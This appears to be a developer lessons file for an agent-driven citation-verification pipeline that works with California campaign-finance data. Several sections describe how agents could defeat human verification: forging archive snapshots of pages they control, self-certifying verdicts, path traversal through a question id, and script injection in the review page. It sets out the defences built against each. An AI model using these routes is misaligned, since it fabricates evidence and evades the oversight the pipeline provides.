Two more places the width has to reach, both found late:
- **Late givers among themselves.** A late name on nobody's schedule is a giver of its own, and
  every late entry that could be them counts for them too. All such names are found before any
  entry is counted: counted as they came, an earlier "Ada C" took "Ada" and never met "Ada B",
  so two $3,000 gifts that could be one giver's $6,000 never passed a $5,000 leader.
- **What a sum already holds.** Every schedule (`""`) sums the Form 496 Part 3 rows, so the
  check left those out as counted. But one contributor's total sums only the rows its exact
  name filter takes, and a row filed another way is a gift it leaves out. So `_late_reports`
  asks the sum's own filter (contributor_total passes its `WHERE` clause). An exclusion that
  says "the figure already has this" has to ask the figure's own query, never assume it.

The options that were rejected, and why:
- **Count `F496P3` in the default and let the cross-form dedup collapse it with its schedule-A
  copy.** Right only where the `TRAN_ID` bases match, and nobody has checked how often they do on
  a real export. Where they don't, the gift counts twice, silently, and large donors are hit
  hardest (the double-count in (4) above).
- **Load `S497_CD` and dedup it the same way.** The same unchecked key, for a form nobody has
  looked at. A gift reported on both late forms is a third copy, which no key here can tell
  from two gifts.
- **Keep schedule A as the default and put a note in the detail.** The short total still renders
  green, for whoever never asked. A note is prose a researcher can skim; a miss is a gate they
  can't. That was the bug.

This is the general rule in "CAL-ACCESS double-counts" applied again. When the only way to count
something rests on a key you can't check, don't count it. Hold it against the result instead.
A key that fails while counting manufactures a figure. A key that fails while flagging only
makes the query refuse.

A database that can't read Form 497 can't say that nothing is pending. That covers a database
built before `S497_CD` was loaded, and one whose `S497_CD` lacks a column the check reads
(`calaccess.LATE_COLUMNS`). Every schedule that reads late reports (the default, `form_type=A`
and `""`) refuses there (`DegradedDatabase`) until `uv run vg calaccess build`, as `ie_total`
does: a warning would let the short total render green, and so would a named schedule that
could not look. Another schedule (`form_type=C`) never reads late reports and still answers. An export with no `S497_CD.TSV` at all has no late reports to miss. `build()` records
the tables the export lacked (`EXPORT_META.not_in_export`), which is how the two are told apart.
Record what the build *found missing*, not what it looked for. A file that was present but
skipped (no header, none of the wanted columns) is an unreadable table, not an empty one.

What is still unchecked on a real export was chosen to fail toward refusing:
- whether a 460 cover's `FORM_TYPE` reads `F460`. If not, no period covers anything, and every
  late entry stays pending.
- what a Form 497 `DATE_THRU` holds. An entry is covered only when one 460 covers it from
  `CTRIB_DATE` through `DATE_THRU`, so a date later than expected keeps it pending. An
  unreadable one does too.

Filing is not the same as restating: a gift inside a filed 460's period that the 460 omitted
reads as restated, and is left out. That is the filer's error, in their own sworn statement.

## A surname is not a candidate

The same applies to donors: `contributor_total` for a common surname summed unrelated people
who share it into one six-figure total. Individuals need `contributor_first`; organizations do
not, since their whole name sits in `CTRIB_NAML`.

`ie_total` for a surname alone returned a total of which under 5% was the candidate's; the rest
was another candidate with the same surname, in a different county and year. It now **requires**
a first name rather than accepting one optionally — an optional guard on a candidate query is
not a guard, because the wrong answer is well-formed and there is no snippet for anyone to check.

## The database can fabricate a finding out of real rows

Asking CAL-ACCESS for independent expenditures naming a two-letter surname, with a substring
match, returned committees supporting a different candidate whose name merely contains those
letters, and reported a multi-million total as the candidate's largest backer.
Every row was real. The amount was real. The person was wrong.

None of the pipeline's defenses apply here: there is no snippet to check, no page to fetch,
no verifier reading context. A query bug produces a confident, well-formed, entirely false
claim. So surname matching is **exact** by default, `--loose` is opt-in, and `--first`
exists because a committee named `<Surname> for <Office> 2026` can belong to either of two
candidates who share the surname.

When you add a query here, ask what it returns for the wrong person.

## An agent's declared tools must match what you told it to do

`verifier.md` said `tools: Read, WebFetch` while its instructions told it to run
`uv run vg judge`. It had no Bash, so it physically could not. All three verifier subagents
went idle in two minutes, wrote nothing, and reported nothing — and because an unjudged
source rendered green, the result was a silent, complete bypass of the judgment pass. The
run looked clean.

Two rules from that:
- When you add a command to an agent's instructions, check its frontmatter grants the tool.
- Make the absence loud rather than trusting the agent ran: a source with no verdict is
  `pending`, never `verified`. `vg judgments` ends with the count of sources that still
  need a verdict.

Silence from a subagent is not success, and the pipeline should not treat it as such.

## Rules agents can skim need a gate they cannot

`researcher.md` has said "5–10 distinctive words" since the first commit, and a one-word
snippet was still written twice in testing. Prose sets the expectation; it does not enforce
it. `vg check-claim` runs the verifier's own checks and exits non-zero, and the researcher
is required to reach a clean exit before reporting done.

Generalize the lesson before adding another paragraph of instruction: if a rule matters and
an agent can violate it, give it a command that fails.

## A gate is a number the tool prints, counting exactly what its step can close

Sessions decided the judgment pass was finished by running `grep -c unreviewed` on the
`vg judgments` table. Rich wraps long rows, so the grep under-reported twice, and a run read
as done while sources had no verdict. A gate that someone derives by counting rows of display
output is only as reliable as the display's layout. So the tool prints the number, as the
last line: `N of M cited source(s) need a verdict (K stale)`. The instructions say to read it,
and the command exits 1 until it reads 0, so an agent that only checks the exit code can't
misread it either.

Getting that number right took six passes, five of them caught in review. In every one, the
count and build disagreed about which sources belonged in it:
- **Too few: a stale verdict counted as done.** `vg build` drops a verdict that predates its
  page, so the count could read 0 while the review app still showed pending rows.
- **Too few: a `support` in the claim file counted as a verdict.** `apply_to()` used to *skip*
  a source with no usable verdict, and build loads claim files trusting machine fields. So a
  `support` already in the file, hand- or agent-written, rendered as judged, which
  self-certifies the judgment pass. `vg verify` rebuilds `Verification` after stripping, so
  pipeline-written files never carry one. `apply_to()` now resets such a source to
  `unreviewed`: a verdict comes from `data/judgments/` or not at all.
- **Too many: sources with nothing to judge counted as waiting.** The verifier judges from a
  source's confirmed context. A citation that failed its checks, is paywalled, or was never
  verified has none. Counted, those made 0 unreachable: a verifier could judge everything it
  was given and never close the gate.
- **Wrong source of truth: classifying by the claim file's status.** Build re-checks that
  status against the cache (`revalidate_from_cache()`) and can disagree. It discards a quote
  that no longer reproduces, and drops a verdict whose context moved since `vg verify`.

Each fix re-derived one more piece of build, and each re-derivation missed something. So
`vg judgments` now *runs* build's offline checks read-only, as `vg status` does:
`judgments.merge()` (the body of `apply_to()`), then `revalidate_from_cache()`. It splits
what build will show without a verdict into two lines. The gate is sources a verdict would
fix: status in `verify.GOOD`, so there is confirmed context, and no usable verdict. The rest
have nothing a verifier can judge yet. Either their status isn't `GOOD`, or revalidation redrew
the excerpt since `vg verify`, which drops any verdict on the old one, including one recorded
now: a verifier judges the claim file's excerpt. Or `vg judge` would refuse one
(`cli._unjudgeable()`, which `vg handoff` asks too). Tests pin the two to add up to
build's `claims.json`. Two more ways the gate read 0 wrongly are also closed: when there was
nothing to count (a typo'd `--data` or `--question-id`), and when `load_claims()` skipped an
unreadable claim file. Both now exit 1.

Two rules come out of it. A gate counts what its own step can close: no more, or it never
reaches 0, and no less, or it reads 0 early. And a count that predicts another command's
result runs that command's code, because a re-derivation drifts.

## The review app renders untrusted text — autoescaping is load-bearing

Everything on that page (claim text, publisher, author, snippets, verification reasons)
is agent-authored and derived from fetched web pages. Escaping is the only thing standing
between an attacker's page and script running in the reviewer's browser — where it could
mark every citation checked in `localStorage` and defeat the human verification this repo
exists to provide.

**Gotcha that already bit once:** `select_autoescape(["html"])` matches on the *filename
suffix*. This template is `review.html.j2` — it ends in `.j2`, so the predicate returned
False and autoescaping was off for the whole app while the code read as though it were on.
Use `autoescape=True`. `report.context_html()` returns `Markup` and escapes its own
interpolations; it is the only value in the template intended as HTML, and nothing else
should ever be marked safe. (`|tojson` also returns `Markup`, JSON- and HTML-escaped: it is
how a value reaches the `<script>`, and only a constant from our code goes through it.)

Same reasoning for `models._http_only`: it validates that a URL is http(s) *and* free of
quotes/whitespace/control characters, because its docstring promises the value is safe to
drop into an `href` and that promise shouldn't depend on every caller escaping correctly.

## archive_url is evidence, so its host AND its target are part of the trust boundary

`verify_against_archive()` fetches `archive_url` and treats a snippet found there as
grounds to mark a paywalled source `verified_via_archive`. That is only sound because the
value is constrained to `https://web.archive.org/` — an arbitrary host would let an agent
stand up a page containing its own fabricated quote and verify against it.

An earlier version of this reasoning was wrong in a way worth recording: it argued a
forged `archive_url` "buys an agent nothing, because the snapshot is fetched and the
snippet must really be in it." That holds only if the agent doesn't control the page being
fetched. Whenever something is fetched and believed, ask who can control what comes back.

The host pin was then wrong the same way, one level down. It says who *serves* a snapshot,
not what it *captured*, and anyone can Save Page Now a page they control. So:
- **The target is checked too.** `archive.snapshot_of()` parses the page out of the Wayback
  path and requires it to be the cited URL — folding only scheme, that scheme's default port,
  one trailing slash, host case and fragment, plus a redirect the pipeline itself saw on the
  live fetch. `verify_against_archive()` and `revalidate_from_cache()` both refuse a mismatch,
  and the former also refuses a snapshot that served an error page or a bot check: either can
  echo the snippet. A snapshot is judged by where its fetch *ended up*, too: fetches follow
  redirects, and the Wayback Machine's nearest capture can replay a redirect to another page.
- **`verified_via_archive` stands on the live page being gated, asked of the page.** Both
  functions require the cached live page to check as `could_not_verify_paywall`. Without it a
  status hand-edited to `verified_via_archive` reproduced against an earlier faithful capture
  and rendered green — "live page not readable" — over a readable page the quote had since
  been removed from; and `vg archive`, which loads trusted, upgraded a paywall status written
  into the claim file the same way. The status is a claim about the live page, so it is
  checked against the live page, never taken from the file.
- **Only the pipeline's own snapshot is ever used.** `archive_url` used to be kept on ingest,
  because `vg verify` strips and writes back and would have deleted every snapshot; its
  safety rested on `vg archive` overwriting it, which it skipped wherever Save Page Now
  failed — always, on cal-access. Now `vg archive` records what it saved in the run's
  `archives.json`, and the archive fields are never read from a claim file in any load mode,
  trusted included: `apply_archive()` sets them from the records in every command that
  writes claims back or renders them, and a command that forgets to shows no snapshot rather
  than the file's. `archives.json` is pipeline-owned the way `judgments/` and the page cache
  are — agents don't write there — and its values still pass the target and content checks
  at every use. A run archived before this has no records, so its snapshots disappear until
  `vg archive` is re-run — failing toward re-checking, and `vg verify` / `vg build` say how
  many they ignored. Adopting the old claim-file values instead is exactly the
  agent-authored input this closes.

## A schema constraint guards only what passes through the schema

`question_id` has been pattern-constrained since claims became files, and that looked like
the traversal defence. It was, for claims. `vg judge` takes its question id from the command
line, where verifier agents (which have Bash) put it, and never builds a `Claim` — so
`vg judge ../claims/q7 …` created and replaced a file outside `judgments/`, and an absolute
id (pathlib drops everything before one) could land anywhere.

So `judgments.path_for()` checks the id against `models.QID_PATTERN` itself: the check lives
where the path is built, which every read or write by question id passes through, not at one of
the doors into it. A shard found by *listing* `judgments/` is read by path instead, since it is
inside the directory by construction. When an agent-supplied value becomes a filename, find the
function that joins it, and check there.

What this bounds is a verdict to `<run>/judgments/`, not the run itself: `--data` is also on
the agent's command line, but naming the run directory is that flag's whole job.

## Known and accepted: the pipeline fetches whatever a claim cites

`vg verify` fetches agent-supplied URLs with redirects followed and no network allowlist,
so a claim citing `http://127.0.0.1:<port>/…` or a link-local address would be fetched and
its text cached. That is SSRF-shaped, and it is deliberate: fetching arbitrary cited URLs
is the entire job. Worth revisiting if this ever runs somewhere with sensitive services on
localhost or a metadata endpoint reachable from the host — restricting targets is a design
decision, not a bug fix.

## Archiving needs a key to actually work

Anonymous Save Page Now rate-limits and 500s hard: a full 31-question run left 58 of ~150
URLs with no snapshot. Authenticated SPN has a much higher quota, so a real run should set
`ARCHIVE_ORG_ACCESS_KEY` and `ARCHIVE_ORG_SECRET_KEY` (keys from
https://archive.org/account/s3.php — creating them needs an archive.org login, so a human
has to do it).

Credentials are read from the environment only. Never in the repo, never in a file this code
reads, never in a claim file, never logged. `credentials()` refuses a half-configured pair
rather than sending a malformed header.

`vg archive` says which mode it is in, because silently degrading to the anonymous path is
how a run ends up with a third of its citations unarchived and nobody noticing until the
report.

Note that a key does not fix everything: cal-access.sos.ca.gov returns 500 from SPN because
its own bot protection blocks the archive crawler. An unarchivable citation is a fact about
the source, not a pipeline failure.

**A successful save is not a usable snapshot.** On at least one cal-access page SPN reported
success and captured the Incapsula bot check — HTTP 200, no text — and `vg archive` recorded
it as archived. On a row whose live page can't be read, that snapshot is the reviewer's only
route to the text, so junk there is worse than nothing: it looks like evidence. Every
snapshot is now checked (`verify.check_snapshot()`): the snippet must be in it, or for a
query citation it must match the live page's text — never just its title, since cal-access
gives every page the same one. A recognized bot check is named. A failure is
`archive_unusable` — a warning, never a failure of the citation — and the row gets a badge
and no archive link — but only on evidence: failing to load a capture (a timeout, a 404 before
the Wayback Machine indexes a fresh one) is not evidence it's junk, while loading one that holds
no text is. A capture that could not be checked (it would not load, or the live page is
unreadable and there is no snippet) is `archive_unconfirmed`: offered, not vouched for. So
is an older capture standing in for a failed save on a query citation: its page furniture can
match while its figures belong to another cycle. `save()` returns that fallback with its
error, so it is never recorded as fresh.

When a save fails, `vg archive` keeps the pipeline's own earlier snapshot over that fallback,
unless ours is known junk (`verify.junk_capture()`: a capture of another URL, a fetch that
landed elsewhere, a bot check, nothing readable). Keeping it unconditionally meant that on a URL
where SPN always fails (cal-access), a captured bot check could never be replaced by a good
capture. Junk is asked of the capture alone, never of a snippet: "the snippet is not in it" can
be the citation's fault, and throwing away a real capture for it would leave the researcher's
retry with nothing. With no fallback to try, ours is kept, so its badge and note survive.

## Stage explicit paths; `git add -A` has bitten this repo twice

Background research runs write into `data/` continuously, and agent worktrees live under
`.claude/worktrees/`. A blanket `git add -A` has therefore twice committed things nobody
meant to: once an agent worktree as an embedded gitlink, once 90 files of a *still-running*
run's judgment data under a commit message describing something else entirely.

Name the paths you intend to commit. If you want everything, look at `git status` first and
confirm no run is mid-flight — a commit whose message and contents disagree is worse than an
untidy tree, because the message is what the next person reads.

**Worktrees share `origin/*` refs, so a stacked branch's base can move while you work.**
Another session's fetch or push updates `origin/<parent>` in every worktree at once. A
`git reset --soft origin/<parent>` to regroup commits, run after the parent gained new
commits, silently put a tree built on the *old* base on top of the new one. The result
reverted every one of the parent's new changes in a commit whose message said nothing about
them. Record the base SHA when you branch, and reset or rebase onto that SHA, not the ref
name. Before pushing a stacked branch, check that `git diff origin/<parent> HEAD --stat`
names only your files.

**A clean merge can delete what your code still uses.** When another branch deletes a helper
or an import that your branch calls but never edits, git takes the deletion without a conflict.
`vg clear-contradiction` hit this against #101's removal of the re-home: its archive helpers
and `judgments.py`'s `import shutil` would have merged away, and only the one test that fails a
clearance on purpose reached the missing import. So when a sibling branch deletes code near
yours, merge it into a scratch worktree (`git worktree add --detach`, outside `data/`) and run
the suite. Then move anything yours still needs into your own diff.

## A typer default is not a value when a test calls the command

Tests call commands as plain functions (`cli.show_judgments(data=...)`), not through typer. A
parameter declared `repair: bool = typer.Option(False, hidden=True)` then gets its Python
default, the `OptionInfo` object, which is truthy: every test that omitted the flag ran the
retired-flag refusal. Give options through `Annotated[bool, typer.Option(...)] = False`, so
the default is a real value either way. Typer does not resolve a `type` alias to an Annotated,
so spell each one out.

## Style

Verdict-first, information-dense, no padding. Distinguish enacted law from proposals and
primary sources from advocacy framing.
